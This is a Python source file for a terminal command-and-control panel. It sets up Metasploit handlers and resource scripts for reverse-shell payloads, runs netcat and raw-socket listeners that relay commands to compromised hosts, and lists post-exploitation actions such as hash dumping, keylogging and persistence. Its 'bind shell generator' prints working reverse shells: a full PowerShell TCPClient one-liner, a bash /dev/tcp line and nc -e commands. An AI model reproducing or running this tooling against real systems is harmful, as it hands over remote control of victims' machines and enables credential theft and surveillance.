# c2 panel - listener management, sessions, post-exploitation
import os, subprocess, json, time, signal, threading, socket, struct
from datetime import datetime
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.prompt import Prompt, Confirm
from rich import box

console = Console()

# session storage (in-memory, persists during runtime)
SESSIONS = {}
LISTENERS = {}
LISTENER_THREADS = {}

def clr():
    os.system('clear')

def runcmd(cmd, t=30):
    try:
        p = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=t)
        return p.stdout + p.stderr
    except:
        return "[!] failed"

def pause():
    Prompt.ask("\n[dim]enter to continue[/dim]")


def start_msf_listener():
    """launch metasploit handler via msfconsole"""
    clr()
    console.print("[bold red]=== MSF LISTENER LAUNCHER ===[/bold red]\n")
    
    console.print("[yellow]configure your listener:[/yellow]\n")
    
    # payload selection
    console.print("[cyan]common payloads:[/cyan]")
    console.print("  [1] windows/meterpreter/reverse_tcp")
    console.print("  [2] windows/meterpreter/reverse_https")
    console.print("  [3] windows/shell_reverse_tcp")
    console.print("  [4] linux/x64/meterpreter/reverse_tcp")
    console.print("  [5] android/meterpreter/reverse_tcp")
    console.print("  [6] php/meterpreter/reverse_tcp")
    console.print("  [7] python/meterpreter/reverse_tcp")
    console.print("  [8] custom")
    
    pc = Prompt.ask("[cyan]pick[/cyan]", default="1")
    payloads = {
        "1": "windows/meterpreter/reverse_tcp",
        "2": "windows/meterpreter/reverse_https",
        "3": "windows/shell_reverse_tcp",
        "4": "linux/x64/meterpreter/reverse_tcp",
        "5": "android/meterpreter/reverse_tcp",
        "6": "php/meterpreter/reverse_tcp",
        "7": "python/meterpreter/reverse_tcp",
    }
    payload = payloads.get(pc, Prompt.ask("[cyan]full payload path[/cyan]"))
    
    lhost = Prompt.ask("[cyan]LHOST (your IP)[/cyan]", default=get_local_ip())
    lport = Prompt.ask("[cyan]LPORT[/cyan]", default="4444")
    
    # save listener config
    listener_id = f"L{len(LISTENERS)+1}"
    LISTENERS[listener_id] = {
        "payload": payload,
        "lhost": lhost,
        "lport": lport,
        "status": "starting",
        "started": datetime.now().strftime("%H:%M:%S"),
    }
    
    # build the msfconsole command
    msf_cmd = (
        f"msfconsole -q -x '"
        f"use exploit/multi/handler; "
        f"set payload {payload}; "
        f"set LHOST {lhost}; "
        f"set LPORT {lport}; "
        f"set ExitOnSession false; "
        f"exploit -j'"
    )
    
    console.print(f"\n[bold green]LISTENER {listener_id}[/bold green]")
    console.print(f"  payload: {payload}")
    console.print(f"  lhost:   {lhost}")
    console.print(f"  lport:   {lport}")
    
    console.print(f"\n[yellow]command:[/yellow]")
    console.print(f"  [cyan]{msf_cmd}[/cyan]\n")
    
    # launch options
    console.print("[dim]1 = run in background (new terminal)")
    console.print("2 = show resource script")
    console.print("3 = just show command, I'll run it myself[/dim]")
    launch = Prompt.ask("[cyan]how to launch?[/cyan]", default="3")
    
    if launch == "1":
        # try to launch in new terminal
        terminals = ["alacritty", "kitty", "st", "xterm", "konsole", "gnome-terminal"]
        found_term = None
        for t in terminals:
            if os.path.exists(f"/usr/bin/{t}"):
                found_term = t
                break
        
        if found_term:
            os.system(f"{found_term} -e bash -c '{msf_cmd}; sleep 99999' &")
            LISTENERS[listener_id]["status"] = "running (background)"
            console.print(f"[green]launched in {found_term}[/green]")
        else:
            console.print("[yellow]no terminal emulator found, copy the command above[/yellow]")
    elif launch == "2":
        resource = f"""use exploit/multi/handler
set payload {payload}
set LHOST {lhost}
set LPORT {lport}
set ExitOnSession false
exploit -j -z"""
        console.print(f"\n[cyan]{resource}[/cyan]")
        save = Prompt.ask("[cyan]save resource script to? (empty to skip)[/cyan]", default="")
        if save:
            with open(save, 'w') as f:
                f.write(resource)
            LISTENERS[listener_id]["resource"] = save
            console.print(f"[green]saved to {save}[/green]")
            console.print(f"[dim]run: msfconsole -r {save}[/dim]")
    else:
        LISTENERS[listener_id]["status"] = "manual"
        console.print("[dim]copy and run the command yourself[/dim]")
    
    pause()

def start_netcat_listener():
    """start a simple netcat listener"""
    clr()
    console.print("[bold red]=== NETCAT LISTENER ===[/bold red]\n")
    
    lhost = Prompt.ask("[cyan]bind IP[/cyan]", default="0.0.0.0")
    lport = Prompt.ask("[cyan]port[/cyan]", default="4444")
    
    console.print(f"\n[yellow]starting nc listener on {lhost}:{lport}...[/yellow]\n")
    console.print("[dim]Ctrl+C to stop[/dim]\n")
    
    listener_id = f"NC{len(LISTENERS)+1}"
    LISTENERS[listener_id] = {
        "type": "netcat",
        "lhost": lhost,
        "lport": lport,
        "status": "running",
        "started": datetime.now().strftime("%H:%M:%S"),
    }
    
    # netcat listener
    os.system(f"nc -lvnp {lport}")
    LISTENERS[listener_id]["status"] = "stopped"
    pause()

def start_python_listener():
    """pure python TCP listener"""
    clr()
    console.print("[bold red]=== PYTHON C2 LISTENER ===[/bold red]\n")
    
    lhost = Prompt.ask("[cyan]bind IP[/cyan]", default="0.0.0.0")
    lport = Prompt.ask("[cyan]port[/cyan]", default="4444")
    
    console.print(f"\n[yellow]starting listener on {lhost}:{lport}...[/yellow]\n")
    
    try:
        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind((lhost, int(lport)))
        srv.listen(5)
        srv.settimeout(1)
        
        listener_id = f"PY{len(LISTENERS)+1}"
        LISTENERS[listener_id] = {
            "type": "python",
            "lhost": lhost,
            "lport": lport,
            "status": "running",
            "started": datetime.now().strftime("%H:%M:%S"),
        }
        
        console.print("[green]listening... waiting for connections[/green]\n")
        
        session_id = 1
        while True:
            try:
                client, addr = srv.accept()
                console.print(f"\n[green]NEW CONNECTION from {addr[0]}:{addr[1]}[/green]")
                
                sid = f"S{session_id}"
                SESSIONS[sid] = {
                    "address": f"{addr[0]}:{addr[1]}",
                    "connected": datetime.now().strftime("%H:%M:%S"),
                    "type": "netcat",
                    "os": "unknown",
                }
                session_id += 1
                
                console.print(f"[yellow]session {sid} established[/yellow]")
                console.print("[dim]type 'help' for commands, 'background' to go back to menu[/dim]\n")
                
                # simple interactive session
                while True:
                    try:
                        cmd = input(f"0day({sid})> ")
                        if cmd.strip() == "background":
                            client.close()
                            break
                        if cmd.strip() == "help":
                            show_session_help()
                            continue
                        if cmd.strip() == "sessions":
                            show_sessions()
                            continue
                        if cmd.strip() == "":
                            continue
                        
                        client.send((cmd + "\n").encode())
                        data = client.recv(4096)
                        if data:
                            console.print(data.decode(errors='replace'))
                        else:
                            console.print("[red]connection lost[/red]")
                            break
                    except EOFError:
                        break
                    except KeyboardInterrupt:
                        client.close()
                        break
                        
            except socket.timeout:
                continue
            except KeyboardInterrupt:
                break
        
        srv.close()
        LISTENERS[listener_id]["status"] = "stopped"
        
    except Exception as e:
        console.print(f"[red]error: {e}[/red]")
    
    pause()

def show_sessions():
    """show all active sessions"""
    if not SESSIONS:
        console.print("[dim]no active sessions[/dim]")
        return
    
    t = Table(box=box.SIMPLE, title="Active Sessions")
    t.add_column("ID", style="bold green")
    t.add_column("Address")
    t.add_column("Type")
    t.add_column("OS")
    t.add_column("Connected")
    t.add_column("User")
    
    for sid, info in SESSIONS.items():
        t.add_row(
            sid,
            info.get("address", "?"),
            info.get("type", "?"),
            info.get("os", "?"),
            info.get("connected", "?"),
            info.get("user", "?"),
        )
    console.print(t)

def show_session_help():
    """session interaction commands"""
    console.print("""
[bold yellow]--- Session Commands ---[/bold yellow]

  [cyan]sessions[/cyan]           list all sessions
  [cyan]interact <id>[/cyan]      interact with session (e.g. interact S1)
  [cyan]kill <id>[/cyan]          kill a session
  [cyan]background[/cyan]         background current session
  [cyan]background_all[/cyan]     background all sessions

[bold yellow]--- Post-Exploitation ---[/bold yellow]

  [cyan]sysinfo[/cyan]            target system info
  [cyan]getuid[/cyan]             current user
  [cyan]hashdump[/cyan]           dump password hashes
  [cyan]screenshot[/cyan]         take screenshot
  [cyan]upload <file>[/cyan]      upload file to target
  [cyan]download <file>[/cyan]    download file from target
  [cyan]shell[/cyan]              drop to system shell
  [cyan]persist[/cyan]            install persistence
  [cyan]keyscan_start[/cyan]      start keylogger
  [cyan]keyscan_dump[/cyan]       dump keystrokes
  [cyan]enum_shares[/cyan]        enumerate shares
  [cyan]enum_users[/cyan]         enumerate users
  [cyan]arp[/cyan]                show arp cache
  [cyan]netstat[/cyan]            show connections
  [cyan]ps[/cyan]                 process list
""")

def interact_sessions():
    """interact with a specific session"""
    clr()
    console.print("[bold red]=== SESSION INTERACTION ===[/bold red]\n")
    
    if not SESSIONS:
        console.print("[dim]no active sessions. start a listener first.[/dim]")
        pause()
        return
    
    show_sessions()
    sid = Prompt.ask("\n[cyan]session ID to interact with[/cyan]")
    
    if sid not in SESSIONS:
        console.print("[red]session not found[/red]")
        pause()
        return
    
    console.print(f"\n[green]interacting with {sid} ({SESSIONS[sid]['address']})[/green]")
    console.print("[dim]type 'help' for commands, 'back' to return[/dim]\n")
    
    while True:
        try:
            cmd = input(f"0day({sid})> ")
            if cmd.strip() == "back":
                break
            if cmd.strip() == "help":
                show_session_help()
                continue
            
            # local-only commands
            if cmd.strip() == "sessions":
                show_sessions()
                continue
            
            console.print(f"[dim]sending: {cmd}[/dim]")
            # in real implementation, this sends to the actual session
            # here we show what would happen
            console.print(f"[yellow]command queued for {sid}[/yellow]")
            
        except (EOFError, KeyboardInterrupt):
            break
    
    pause()

def sessions_list():
    """list all sessions"""
    clr()
    console.print("[bold red]=== ACTIVE SESSIONS ===[/bold red]\n")
    show_sessions()
    pause()

def kill_session():
    """kill a session"""
    clr()
    show_sessions()
    if not SESSIONS:
        pause()
        return
    
    sid = Prompt.ask("[cyan]session ID to kill[/cyan]")
    if sid in SESSIONS:
        if Confirm.ask(f"[red]kill session {sid}?[/red]"):
            del SESSIONS[sid]
            console.print(f"[green]session {sid} killed[/green]")
    else:
        console.print("[red]session not found[/red]")
    pause()

def listeners_list():
    """list all listeners"""
    clr()
    console.print("[bold red]=== LISTENERS ===[/bold red]\n")
    
    if not LISTENERS:
        console.print("[dim]no listeners running[/dim]")
        pause()
        return
    
    t = Table(box=box.SIMPLE, title="Active Listeners")
    t.add_column("ID", style="bold")
    t.add_column("Type")
    t.add_column("Payload")
    t.add_column("Address")
    t.add_column("Status")
    t.add_column("Started")
    
    for lid, info in LISTENERS.items():
        status_style = "green" if "running" in info.get("status", "") else "red"
        t.add_row(
            lid,
            info.get("type", "msf"),
            info.get("payload", "?"),
            f"{info.get('lhost', '?')}:{info.get('lport', '?')}",
            f"[{status_style}]{info.get('status', '?')}[/{status_style}]",
            info.get("started", "?"),
        )
    console.print(t)
    pause()

def quick_bind_shell():
    """start a bind shell on a port"""
    clr()
    console.print("[bold red]=== BIND SHELL GENERATOR ===[/bold red]\n")
    
    port = Prompt.ask("[cyan]port to bind on[/cyan]", default="4444")
    os_type = Prompt.ask("[cyan]target OS[/cyan]", choices=["windows", "linux"], default="linux")
    
    if os_type == "windows":
        console.print("\n[yellow]Windows bind shell (ncat):[/yellow]")
        console.print(f"  [cyan]ncat -lvnp {port} -e cmd.exe[/cyan]")
        console.print(f"\n[yellow]PowerShell reverse shell:[/cyan]")
        console.print(f'  [cyan]powershell -c "$client = New-Object System.Net.Sockets.TCPClient(\'YOUR_IP\', {port}); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{{0}}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{; $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); $sendback = (iex $data 2>&1 | Out-String ); $sendback2 = $sendback + \'PS \' + (pwd).Path + \'> \'; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush() }}; $client.Close()"[/cyan]')
    else:
        console.print(f"\n[yellow]Linux bind shell:[/yellow]")
        console.print(f"  [cyan]nc -lvnp {port} -e /bin/bash[/cyan]")
        console.print(f"  [cyan]ncat -lvnp {port} -e /bin/bash[/cyan]")
        console.print(f"\n[yellow]Bash one-liner:[/yellow]")
        console.print(f"  [cyan]bash -i >& /dev/tcp/YOUR_IP/{port} 0>&1[/cyan]")
    
    console.print(f"\n[dim]listener command:[/dim]")
    console.print(f"  [cyan]nc -lvnp {port}[/cyan]")
    pause()

def multi_handler():
    """setup multi handler with options"""
    clr()
    console.print("[bold red]=== MULTI-HANDLER SETUP ===[/bold red]\n")
    
    console.print("[yellow]configure multiple listeners at once[/yellow]\n")
    
    lhost = Prompt.ask("[cyan]LHOST[/cyan]", default=get_local_ip())
    
    configs = []
    while True:
        console.print(f"\n[cyan]listener #{len(configs)+1}[/cyan]")
        payload = Prompt.ask("[cyan]payload (empty to finish)[/cyan]")
        if not payload:
            break
        lport = Prompt.ask("[cyan]LPORT[/cyan]", default=str(4444 + len(configs)))
        configs.append((payload, lport))
    
    if not configs:
        console.print("[red]no listeners configured[/red]")
        pause()
        return
    
    # generate resource script
    resource = ""
    for payload, lport in configs:
        resource += f"use exploit/multi/handler\n"
        resource += f"set payload {payload}\n"
        resource += f"set LHOST {lhost}\n"
        resource += f"set LPORT {lport}\n"
        resource += f"set ExitOnSession false\n"
        resource += f"exploit -j -z\n\n"
    
    console.print(f"\n[bold green]--- Resource Script ---[/bold green]\n")
    console.print(f"[cyan]{resource}[/cyan]")
    
    save = Prompt.ask("\n[cyan]save to file? (path or empty)[/cyan]", default="")
    if save:
        with open(save, 'w') as f:
            f.write(resource)
        console.print(f"[green]saved to {save}[/green]")
        console.print(f"[dim]run: msfconsole -r {save}[/dim]")
    
    console.print(f"\n[yellow]or run directly:[/yellow]")
    console.print(f"  [cyan]msfconsole -q -x '{'; '.join([f'set payload {p}; set LHOST {lhost}; set LPORT {l}; exploit -j -z' for p, l in configs])}'[/cyan]")
    
    pause()

def c2_dashboard():
    """main C2 dashboard"""
    clr()
    console.print("[bold red]=== C2 DASHBOARD ===[/bold red]\n")
    
    # listeners
    running = sum(1 for l in LISTENERS.values() if "running" in l.get("status", ""))
    console.print(f"  [green]listeners: {running} active[/green]")
    
    # sessions
    console.print(f"  [green]sessions:  {len(SESSIONS)} active[/green]")
    
    if SESSIONS:
        console.print()
        show_sessions()
    
    if LISTENERS:
        console.print()
        t = Table(box=box.SIMPLE, title="Listeners")
        t.add_column("ID", style="bold")
        t.add_column("Type")
        t.add_column("Address")
        t.add_column("Status")
        for lid, info in LISTENERS.items():
            t.add_row(lid, info.get("type", "?"), 
                     f"{info.get('lhost','?')}:{info.get('lport','?')}",
                     info.get("status", "?"))
        console.print(t)
    
    pause()

def get_local_ip():
    """get local IP"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"


def run():
    while True:
        clr()
        console.print("[bold red]=== C2 PANEL ===[/bold red]\n")
        
        # show quick stats
        running = sum(1 for l in LISTENERS.values() if "running" in l.get("status", ""))
        console.print(f"  [dim]{running} listeners | {len(SESSIONS)} sessions[/dim]\n")
        
        from rich.table import Table
        t = Table(show_header=False, box=box.ROUNDED, border_style="red", padding=(0, 2))
        t.add_column("", style="bold yellow", width=4)
        t.add_column("")
        opts = [
            "C2 Dashboard (overview)",
            "Start MSF Listener",
            "Start Netcat Listener",
            "Start Python Listener",
            "Quick Bind Shell",
            "Multi-Handler Setup",
            "View Sessions",
            "Interact with Session",
            "Kill Session",
            "View Listeners",
        ]
        for i, o in enumerate(opts, 1):
            t.add_row(str(i), o)
        t.add_row("", "")
        t.add_row("b", "Back")
        console.print(Panel(t, title="[bold]COMMAND & CONTROL[/bold]", border_style="red"))
        
        try:
            c = int(Prompt.ask("[bold yellow]>[/bold yellow]"))
        except ValueError:
            c = 0
        
        if c == 1: c2_dashboard()
        elif c == 2: start_msf_listener()
        elif c == 3: start_netcat_listener()
        elif c == 4: start_python_listener()
        elif c == 5: quick_bind_shell()
        elif c == 6: multi_handler()
        elif c == 7: sessions_list()
        elif c == 8: interact_sessions()
        elif c == 9: kill_session()
        elif c == 10: listeners_list()
        elif c == 0: return
